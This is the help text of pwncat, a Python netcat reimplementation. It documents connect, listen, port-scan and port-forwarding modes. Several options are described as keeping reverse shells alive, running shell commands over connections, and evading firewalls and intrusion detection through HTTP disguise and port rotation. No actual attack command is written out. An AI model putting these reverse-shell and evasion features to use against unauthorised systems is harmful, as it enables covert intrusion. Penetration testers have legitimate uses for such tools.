<pre class="hi"><code>

Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion detection/prevention systems.

If no mode arguments are specified, pwncat will run in connect mode and act as
a client to connect to a remote endpoint. If the connection to the remote
endoint is lost, pwncat will quit. See advanced options for how to automatically
reconnect.

<pre class="hi"><code>
positional arguments:
  hostname              Address to listen, forward or connect to
  port                  Port to listen, forward or connect to

<pre class="hi"><code>
mode arguments:
  -l, --listen          [Listen mode]:
                        Start a server and listen for incoming connections.
                        If using TCP and a connected client disconnects or the
                        connection is interrupted otherwise, the server will
                        quit. See -k/--keep-open to change this behaviour.

  -z, --zero            [Zero-I/0 mode]:
                        Connect to a remote endpoint and report status only.
                        Used for port scanning.

  -L addr:port, --local addr:port
                        [Local forward mode]:
                        This mode will start a server and a client internally.
                        The internal server will listen locally on specified
                        hostname/port (positional arguments). Same as with -l.
                        The server will then forward traffic to the internal
                        client which connects to another server specified by
                        address given via -L/--local addr:port.
                        (I.e.: proxies a remote service to a local address)

  -R addr:port, --remote addr:port
                        [Remote forward mode]:
                        This mode will start two clients internally. One is
                        connecting to the target and one is connecting to
                        another pwncat/netcat server you have started some-
                        where. Once connected, it will then proxy traffic
                        between you and the target.
                        This mode should be applied on machines that block
                        incoming traffic and only allow outbound.
                        The connection to your listening server is given by
                        -R/--remote addr:port and the connection to the
                        target machine via the positional arguments.

<pre class="hi"><code>
optional arguments:
  -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
  -C, --crlf            Replace LF with CRLF from stdin (default: don't)
  -n, --nodns           Do not resolve DNS.
  -u, --udp             Use UDP for the connection instead of TCP.
  -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv
                        or -vvvv for more verbosity. The server performance will
                        decrease drastically if you use more than three times.
  -c str, --color str   Colored log output. Specify 'always', 'never' or 'auto'.
                        In 'auto' mode, color is displayed as long as the output
                        goes to a terminal. If it is piped into a file, color
                        will automatically be disabled. This mode also disables
                        color on Windows by default. (default: auto)

<pre class="hi"><code>
advanced arguments:
  --http                Connect / Listen / Local forward mode (TCP only):
                        Hide traffic in http packets to fool Firewalls/IDS/IPS.

  --https               Connect / Listen / Local forward mode (TCP only):
                        Hide traffic in https packets to fool Firewalls/IDS/IPS.

  -k, --keep-open       Listen mode (TCP only):
                        Re-accept new clients in listen mode after a client has
                        disconnected or the connection is unterrupted otherwise.
                        (default: server will quit after connection is gone)

  --rebind x            Listen mode (TCP and UDP):
                        If the server is unable to bind, it will re-initialize
                        itself x many times before giving up. Use 0 to re-init
                        endlessly. (default: fail after first unsuccessful try).

  --rebind-wait s       Listen mode (TCP and UDP):
                        Wait x seconds between re-initialization. (default: 1)

  --rebind-robin port   Listen mode (TCP and UDP):
                        If the server is unable to initialize (e.g: cannot bind
                        and --rebind is specified, it it will shuffle ports in
                        round-robin mode to bind to. Use comma separated string
                        such as '80,81,82' or a range of ports '80-100'.
                        Set --rebind to at least the number of ports to probe +1
                        This option requires --rebind to be specified.

  --reconn x            Connect mode / Zero-I/O mode (TCP only):
                        If the remote server is not reachable or the connection
                        is interrupted, the client will connect again x many
                        times before giving up. Use 0 to retry endlessly.
                        (default: quit if the remote is not available or the
                        connection was interrupted)
                        This might be handy for stable TCP reverse shells ;-)

  --reconn-wait s       Connect mode / Zero-I/O mode (TCP only):
                        Wait x seconds between re-connects. (default: 1)

  --reconn-robin port   Connect mode / Zero-I/O mode (TCP only):
                        If the remote server is not reachable or the connection
                        is interrupted and --reconn is specified, the client
                        will shuffle ports in round-robin mode to connect to.
                        Use comma separated string such as '80,81,82' or a range
                        of ports '80-100'.
                        Set --reconn to at least the number of ports to probe +1
                        This helps reverse shell to evade intrusiona prevention
                        systems that will cut your connection and block the
                        outbound port.
                        This is also useful in Connect or Zero-I/O mode to
                        figure out what outbound ports are allowed.

  -w s, --wait s        Connect mode (TCP only):
                        If a connection and stdin are idle for more than s sec,
                        then the connection is silently closed and the client
                        will exit. (default: wait forever).
                        Note: if --reconn is specified, the connection will be
                        re-opened.

  --udp-ping-init       Connect mode / Zero-I/O mode (UDP only):
                        UDP is a stateless protocol unlike TCP, so no hand-
                        shake communication takes place and the client just
                        sends data to a server without being "accepted" by
                        the server first.
                        This means a server waiting for an UDP client to
                        connect to, is unable to send any data to the client,
                        before the client hasn't send data first. The server
                        simply doesn't know the IP address before an initial
                        connect.
                        The --udp-ping-init option instructs the client to send
                        one single initial ping packet to the server, so that it
                        is able to talk to the client.
                        This is the only way to make a UDP reverse shell work.
                        See --udp-ping-word for what char/string to send as
                        initial ping packet (default: '\0')

  --udp-ping-intvl s    Connect mode / Zero-I/O mode (UDP only):
                        Instruct the UDP client to send ping intervalls every
                        s seconds. This allows you to restart your UDP server
                        and just wait for the client to report back in.
                        This might be handy for stable UDP reverse shells ;-)
                        See --udp-ping-word for what char/string to send as
                        initial ping packet (default: '\0')

  --udp-ping-word str   Connect mode / Zero-I/O mode (UDP only):
                        Change the default character '\0' to use for upd ping.
                        Single character or strings are supported.

  --udp-ping-robin port
                        Zero-I/O mode (UDP only):
                        Instruct the UDP client to shuffle the specified ports
                        in round-robin mode for a remote server to ping.
                        This might be handy to scan outbound allowed ports.
                        Use --udp-ping-intvl 0 to be faster.

  --safe-word str       All modes:
                        If pwncat is started with this argument, it will shut
                        down as soon as it receives the specified string. The
                        --keep-open (server) or --reconn (client) options will
                        be ignored and it won't listen again or reconnect to you.
                        Use a very unique string to not have it shut down
                        accidentally by other input.
